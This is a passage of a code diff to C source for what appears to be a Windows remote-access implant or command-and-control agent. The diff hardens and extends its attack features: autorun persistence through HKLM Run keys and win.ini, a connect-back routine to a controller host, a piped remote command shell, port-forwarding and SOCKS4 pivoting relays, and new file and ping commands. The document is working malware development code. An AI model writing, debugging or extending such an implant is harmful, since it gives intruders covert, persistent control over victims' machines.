+    if (ls == INVALID_SOCKET) { slot->active=0; send_str(s, "portfwd: socket failed\r\n"); return send_done(s); }
     { int r = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char *)&r, sizeof(r)); }
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_port = htons((unsigned short)lport);
     if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) != 0 || listen(ls, 8) != 0) {
-        closesocket(ls);
+        closesocket(ls); slot->active=0;
         send_str(s, "portfwd: bind/listen failed\r\n"); return send_done(s);
     }
 
@@ -1463,19 +1686,22 @@ static int cmd_socks4(SOCKET s, const char *args)
         send_str(s, "socks4: usage: socks4 <lport>\r\n"); return send_done(s);
     }
 
+    EnterCriticalSection(&g_relay_cs);
     for (i = 0; i < MAX_RELAYS; i++) {
         if (!g_relays[i].active) { slot = &g_relays[i]; break; }
     }
+    if (slot) slot->active = 1;
+    LeaveCriticalSection(&g_relay_cs);
     if (!slot) { send_str(s, "socks4: too many active relays\r\n"); return send_done(s); }
 
     ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (ls == INVALID_SOCKET) { send_str(s, "socks4: socket failed\r\n"); return send_done(s); }
+    if (ls == INVALID_SOCKET) { slot->active=0; send_str(s, "socks4: socket failed\r\n"); return send_done(s); }
     { int r = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char *)&r, sizeof(r)); }
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_port = htons((unsigned short)lport);
     if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) != 0 || listen(ls, 16) != 0) {
-        closesocket(ls); send_str(s, "socks4: bind/listen failed\r\n"); return send_done(s);
+        closesocket(ls); slot->active=0; send_str(s, "socks4: bind/listen failed\r\n"); return send_done(s);
     }
 
     memset(slot, 0, sizeof(*slot));
@@ -1624,21 +1850,26 @@ static int cmd_persist(SOCKET s, const char *args)
 
     if (is_nt || GetVersion() < 0x80000000UL) {
         /* NT or Win95/98: use HKLM\...\Run */
-        const char *regpath = is_nt
+        const char *regpath;
+        if (!t_advapi32_avail) {
+            send_str(s, "persist: registry unavailable (no advapi32.dll)\r\n");
+            return send_done(s);
+        }
+        regpath = is_nt
             ? "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Run"
             : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 
         if (remove_mode) {
-            ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, KEY_SET_VALUE, &hkey);
-            if (ret == ERROR_SUCCESS) { RegDeleteValue(hkey, value_name); RegCloseKey(hkey); }
+            ret = r_RegOpenKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, KEY_SET_VALUE, &hkey);
+            if (ret == ERROR_SUCCESS) { r_RegDeleteValue(hkey, value_name); r_RegCloseKey(hkey); }
             send_str(s, "persist: autorun entry removed\r\n");
         } else {
-            ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, NULL, 0,
+            ret = r_RegCreateKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, NULL, 0,
                                  KEY_SET_VALUE, NULL, &hkey, NULL);
             if (ret == ERROR_SUCCESS) {
-                RegSetValueEx(hkey, value_name, 0, REG_SZ,
+                r_RegSetValueEx(hkey, value_name, 0, REG_SZ,
                               (BYTE *)self_path, (DWORD)lstrlen(self_path)+1);
-                RegCloseKey(hkey);
+                r_RegCloseKey(hkey);
                 wsprintf(msg, "persist: added to %s\\%s\r\n", regpath, value_name);
                 send_str(s, msg);
             } else {
@@ -1654,9 +1885,19 @@ static int cmd_persist(SOCKET s, const char *args)
             p = existing;
             while (*p) {
                 char *start = p;
+                char  unq[MAX_PATH];
+                int   ul;
                 while (*p && *p != ' ') p++;
                 if (*p) *p++ = '\0';
-                if (lstrcmpi(start, self_path) != 0) {
+                /* strip surrounding quotes before comparing — entries may be
+                 * quoted (written by this code) or bare (written externally) */
+                lstrcpyn(unq, start, MAX_PATH);
+                ul = lstrlen(unq);
+                if (ul >= 2 && unq[0] == '"' && unq[ul-1] == '"') {
+                    memmove(unq, unq+1, ul-1);
+                    unq[ul-2] = '\0';
+                }
+                if (lstrcmpi(unq, self_path) != 0) {
                     if (newval[0]) lstrcat(newval, " ");
                     lstrcat(newval, start);
                 }
@@ -1666,8 +1907,11 @@ static int cmd_persist(SOCKET s, const char *args)
         } else {
             char existing[2048] = "", newval[2048];
             GetProfileString("windows", "load", "", existing, sizeof(existing));
-            if (existing[0]) wsprintf(newval, "%s %s", existing, self_path);
-            else             lstrcpyn(newval, self_path, sizeof(newval)-1);
+            /* Guard against overflow: existing (2047) + space + quoted path (261) > newval (2048) */
+            if (existing[0] && lstrlen(existing) + lstrlen(self_path) + 4 < 2048)
+                wsprintf(newval, "%s \"%s\"", existing, self_path);
+            else
+                wsprintf(newval, "\"%s\"", self_path);
             WriteProfileString("windows", "load", newval);
             send_str(s, "persist: added to win.ini [windows] load=\r\n");
         }
@@ -1750,6 +1994,84 @@ static int cmd_pinfo(SOCKET s, const char *arg)
     } while (fP32N(snap,&pe));
     CloseHandle(snap);
     if (!found) { wsprintf(line,"pinfo: pid %lu not found\r\n",pid); send_str(s,line); }
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_ping — ICMP echo via icmp.dll (NT 3.5+ / Win95+)
+ * Sends 4 pings, streams results back, same as the OS ping command.
+ * icmp.dll is loaded once and kept; absent on NT 3.1 and Win32s.
+ * ----------------------------------------------------------------------- */
+static int cmd_ping(SOCKET s, const char *arg)
+{
+    static HMODULE     hIcmp   = NULL;
+    static pfIcmpCreate fCreate = NULL;
+    static pfIcmpClose  fClose  = NULL;
+    static pfIcmpSend   fSend   = NULL;
+    HANDLE  hFile;
+    DWORD   dest;
+    char    replybuf[sizeof(NC_ICMP_REPLY) + 32];
+    char    line[128];
+    int     i;
+    static const char payload[] = "ÆldreC2";
+
+    if (!arg||!arg[0]) { send_str(s,"ping: usage: ping <host>\r\n"); return send_done(s); }
+
+    if (!hIcmp) {
+        hIcmp = LoadLibrary("icmp.dll");
+        if (hIcmp) {
+            fCreate = (pfIcmpCreate)GetProcAddress(hIcmp,"IcmpCreateFile");
+            fClose  = (pfIcmpClose) GetProcAddress(hIcmp,"IcmpCloseHandle");
+            fSend   = (pfIcmpSend)  GetProcAddress(hIcmp,"IcmpSendEcho");
+            if (!fCreate||!fClose||!fSend) { FreeLibrary(hIcmp); hIcmp=NULL; }
+        }
+    }
+    if (!hIcmp) {
+        send_str(s,"ping: icmp.dll not available (requires NT 3.5+ or Win95)\r\n");
+        return send_done(s);
+    }
+
+    dest = inet_addr(arg);
+    if (dest == INADDR_NONE) {
+        struct hostent *he = gethostbyname(arg);
+        if (!he) {
+            wsprintf(line,"ping: cannot resolve '%s'\r\n",arg);
+            send_str(s,line); return send_done(s);
+        }
+        dest = *(DWORD *)he->h_addr;
+    }
+
+    hFile = fCreate();
+    if (hFile == INVALID_HANDLE_VALUE) {
+        send_str(s,"ping: IcmpCreateFile failed\r\n"); return send_done(s);
+    }
+
+    { struct in_addr ia; ia.s_addr=dest;
+      wsprintf(line,"Pinging %s:\r\n",inet_ntoa(ia)); send_str(s,line); }
+
+    for (i=0; i<4; i++) {
+        DWORD ret;
+        memset(replybuf,0,sizeof(replybuf));
+        ret = fSend(hFile, dest, (void*)payload, (WORD)sizeof(payload)-1,
+                    NULL, replybuf, sizeof(replybuf), 1000);
+        if (ret>0) {
+            NC_ICMP_REPLY *r = (NC_ICMP_REPLY*)replybuf;
+            if (r->Status==0) {
+                struct in_addr ia; ia.s_addr=r->Address;
+                wsprintf(line,"Reply from %s: time=%lums TTL=%u\r\n",
+                         inet_ntoa(ia),(unsigned long)r->RoundTripTime,
+                         (unsigned)r->Options.Ttl);
+            } else {
+                wsprintf(line,"Request timed out (status %lu)\r\n",r->Status);
+            }
+        } else {
+            wsprintf(line,"Request timed out\r\n");
+        }
+        send_str(s,line);
+        if (i<3) Sleep(1000);
+    }
+
+    fClose(hFile);
     return send_done(s);
 }
 
@@ -2287,23 +2609,18 @@ static int cmd_shell(SOCKET s, const char *shell_path)
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
         send_str(s, "shell: CreatePipe failed\r\n"); return send_done(s);
     }
-    if (!CreatePipe(&hProcIn, NULL, &sa, 0)) {
-        /* Create a writable end for shell stdin — use temp name */
-        HANDLE hTmpR, hTmpW;
-        CreatePipe(&hTmpR, &hTmpW, &sa, 0);
-        CloseHandle(hTmpR);
-        hProcIn = hTmpW;
-    }
 
-    /* Proper piped shell stdin */
     {
         HANDLE hStdinR, hStdinW;
-        CloseHandle(hProcIn);
-        CreatePipe(&hStdinR, &hStdinW, &sa, 0);
+        if (!CreatePipe(&hStdinR, &hStdinW, &sa, 0)) {
+            CloseHandle(hRead); CloseHandle(hWrite);
+            send_str(s, "shell: CreatePipe failed\r\n"); return send_done(s);
+        }
+        /* Write end of stdin pipe must not be inherited by the child */
         SetHandleInformation(hStdinW, HANDLE_FLAG_INHERIT, 0);
-        hProcIn = hStdinW;
-
+        /* Read end of stdout pipe must not be inherited by the child */
         SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+        hProcIn = hStdinW;
 
         wsprintf(cmdline, "%s", shell_path);
         memset(&si,0,sizeof(si)); si.cb=sizeof(si);
@@ -2577,7 +2894,7 @@ static int cmd_rdp(SOCKET s, const char *args)
  * ----------------------------------------------------------------------- */
 static void run_session(SOCKET s)
 {
-    char shell[MAX_PATH], cmd[CMD_BUFSZ], banner[512];
+    char shell[MAX_PATH], cmd[CMD_BUFSZ], banner[768]; /* 768 > 2*MAX_PATH + overhead */
     char compname[MAX_PATH]; DWORD namesz=MAX_PATH;
     OSVERSIONINFO osv; int n, rc;
 
@@ -2615,6 +2932,9 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"scan"))       rc=cmd_scan(s,cmd_arg(cmd,"scan"));
         else if(cmd_is(cmd,"del"))        rc=cmd_del(s,cmd_arg(cmd,"del"));
         else if(cmd_is(cmd,"ren"))        rc=cmd_ren(s,cmd_arg(cmd,"ren"));
+        else if(cmd_is(cmd,"mkdir"))      rc=cmd_mkdir(s,cmd_arg(cmd,"mkdir"));
+        else if(cmd_is(cmd,"cp"))         rc=cmd_cp(s,cmd_arg(cmd,"cp"));
+        else if(cmd_is(cmd,"attrib"))     rc=cmd_attrib(s,cmd_arg(cmd,"attrib"));
         else if(cmd_is(cmd,"find"))       rc=cmd_find(s,cmd_arg(cmd,"find"));
         else if(cmd_is(cmd,"tasklist"))   rc=cmd_tasklist(s);
         else if(cmd_is(cmd,"regs"))       rc=cmd_regs(s,cmd_arg(cmd,"regs"));
@@ -2624,6 +2944,7 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"kill"))       rc=cmd_kill(s,cmd_arg(cmd,"kill"));
         else if(cmd_is(cmd,"pinfo"))      rc=cmd_pinfo(s,cmd_arg(cmd,"pinfo"));
         else if(cmd_is(cmd,"resolve"))    rc=cmd_resolve(s,cmd_arg(cmd,"resolve"));
+        else if(cmd_is(cmd,"ping"))       rc=cmd_ping(s,cmd_arg(cmd,"ping"));
         else if(cmd_is(cmd,"ifconfig"))   rc=cmd_ifconfig(s);
         else if(cmd_is(cmd,"netstat"))    rc=cmd_netstat(s);
         else if(cmd_is(cmd,"route"))      rc=cmd_route(s);
@@ -2645,13 +2966,18 @@ static SOCKET tank_connect(void)
     s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (s == INVALID_SOCKET) return INVALID_SOCKET;
 
-    he = gethostbyname(g_clu.host);
-    if (!he) { closesocket(s); return INVALID_SOCKET; }
-
     memset(&addr,0,sizeof(addr));
-    addr.sin_family      = AF_INET;
-    addr.sin_port        = htons(g_clu.port);
-    addr.sin_addr.s_addr = *(DWORD *)he->h_addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port   = htons(g_clu.port);
+    /* Try dotted-decimal first; fall back to DNS.
+     * Some old Win32s Winsock stacks don't accept numeric strings in
+     * gethostbyname(), so inet_addr() is tried first to avoid that path. */
+    addr.sin_addr.s_addr = inet_addr(g_clu.host);
+    if (addr.sin_addr.s_addr == INADDR_NONE) {
+        he = gethostbyname(g_clu.host);
+        if (!he) { closesocket(s); return INVALID_SOCKET; }
+        addr.sin_addr.s_addr = *(DWORD *)he->h_addr;
+    }
 
     if (connect(s,(struct sockaddr*)&addr,sizeof(addr)) == SOCKET_ERROR) {
         closesocket(s); return INVALID_SOCKET;
@@ -2675,7 +3001,9 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 
     if (!recognizer_check()) return 0;
 
+    InitializeCriticalSection(&g_relay_cs);
     tls_load();
+    advapi32_load();
 
     if (WSAStartup(MAKEWORD(1,1),&wsa) != 0) return 1;
 
